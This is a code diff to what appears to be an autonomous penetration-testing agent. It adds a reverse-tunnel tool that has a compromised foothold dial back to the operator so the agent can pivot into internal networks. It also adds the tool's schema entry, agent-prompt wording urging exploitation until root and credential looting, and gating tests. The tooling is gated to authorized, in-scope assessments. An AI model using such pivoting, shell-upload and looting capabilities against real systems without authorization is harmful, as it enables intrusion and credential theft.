@@ -128,6 +128,7 @@ class Agent:
         self.shots: list[dict] = []  # screenshots captured this run → embedded in the report
         self.channel = None  # exec foothold once established
         self.proxies = None  # SOCKS tunnel through the foothold, once opened
+        self._reverse_tunnel = None  # Watson-side reverse-tunnel listeners, kept alive
         self.done = False    # the agent declares the assessment complete
         self.cancelled = False  # set when a graceful stop was requested mid-run
         self.authed = False  # an authenticated session is loaded (self.session carries it)
@@ -346,6 +347,23 @@ class Agent:
         return {"tunnel": self.proxies,
                 "note": "http_probe now routes through the foothold — probe IN-SCOPE internal hosts"}
 
+    def open_reverse_tunnel(self, callback_host: str = "", master_port: int = 8443,
+                            port: int = 1080) -> dict:
+        """Open a REVERSE tunnel: the foothold dials BACK to you. Use when the foothold is
+        behind NAT / an inbound firewall so open_tunnel can't reach it. http_probe then routes
+        through it exactly like open_tunnel."""
+        if not self.exploit:
+            return {"error": "requires exploitation to be enabled (--exploit)"}
+        if self.channel is None:
+            return {"error": "no foothold — call establish_foothold first"}
+        from .pivot import local_ip, open_reverse_socks
+        cb = callback_host or local_ip()
+        self._reverse_tunnel, self.proxies = open_reverse_socks(
+            self.channel, cb, socks_port=port, master_port=master_port)
+        return {"tunnel": self.proxies, "callback": f"{cb}:{master_port}",
+                "note": "the foothold dials BACK to you; http_probe now routes through it — "
+                        "probe IN-SCOPE internal hosts"}
+
     def pivot_scan(self) -> dict:
         """Map the internal network from the foothold (interfaces, neighbors, services)."""
         if not self.exploit:
@@ -503,6 +521,7 @@ class Agent:
                   "browse": self.browse, "browser_action": self.browser_action,
                   "upload_shell": self.upload_shell, "make_payload": self.make_payload,
                   "pivot_scan": self.pivot_scan, "open_tunnel": self.open_tunnel,
+                  "open_reverse_tunnel": self.open_reverse_tunnel,
                   "ad_recon": self.ad_recon, "ad_exec": self.ad_exec,
                   "win_privesc_scan": self.win_privesc_scan}.get(name)
             if not fn:
@@ -629,6 +648,17 @@ TOOLS = [
         "parameters": {"type": "object", "properties": {
             "host": {"type": "string", "description": "foothold host reachable from here (default: target)"},
             "port": {"type": "integer"}}}}},
+    {"type": "function", "function": {
+        "name": "open_reverse_tunnel",
+        "description": "Open a REVERSE tunnel when the foothold is behind NAT or an inbound "
+                       "firewall and open_tunnel can't reach it: the foothold connects BACK to you, "
+                       "and http_probe then routes through it to IN-SCOPE internal hosts (same effect "
+                       "as open_tunnel). Requires a foothold.",
+        "parameters": {"type": "object", "properties": {
+            "callback_host": {"type": "string",
+                              "description": "your address the foothold can reach (default: auto-detected)"},
+            "master_port": {"type": "integer", "description": "port the foothold dials back to (default 8443)"},
+            "port": {"type": "integer", "description": "local SOCKS port probes use (default 1080)"}}}}},
     {"type": "function", "function": {
         "name": "ad_recon",
         "description": "Active Directory / Windows recon over the network (via nxc). Enumerate an "
@@ -780,7 +810,9 @@ EXPLOIT_NOTE = (" EXPLOITATION IS AUTHORIZED AND ENABLED. Actively try to break 
                 "escalation won't always be listed. Keep going until you are root or out of leads. "
                 "Once you have a foothold, call pivot_scan to map the internal network and reach "
                 "other IN-SCOPE internal hosts via run_command (curl/nc through the foothold), or "
-                "open_tunnel to route http_probe through the foothold and attack internal web hosts. "
+                "open_tunnel to route http_probe through the foothold and attack internal web hosts "
+                "(use open_reverse_tunnel instead when the foothold is behind NAT / can't accept "
+                "inbound and open_tunnel can't reach it). "
                 "After the foothold, and again once root, call loot to capture credentials, keys, "
                 "and proof files (root.txt/user.txt) and record notable captures as findings. "
                 "For an IN-SCOPE Windows / Active Directory target, use ad_recon to enumerate it "
@@ -1023,6 +1055,8 @@ if __name__ == "__main__":  # self-check: python -m watson.agent (tool gating, o
     assert "no foothold" in exp.pivot_scan()["error"]
     assert "requires exploitation" in dev.open_tunnel()["error"]
     assert "no foothold" in exp.open_tunnel()["error"]
+    assert "requires exploitation" in dev.open_reverse_tunnel()["error"]
+    assert "no foothold" in exp.open_reverse_tunnel()["error"]
     assert "requires exploitation" in dev.loot()["error"]
     assert "no foothold" in exp.loot()["error"]
 
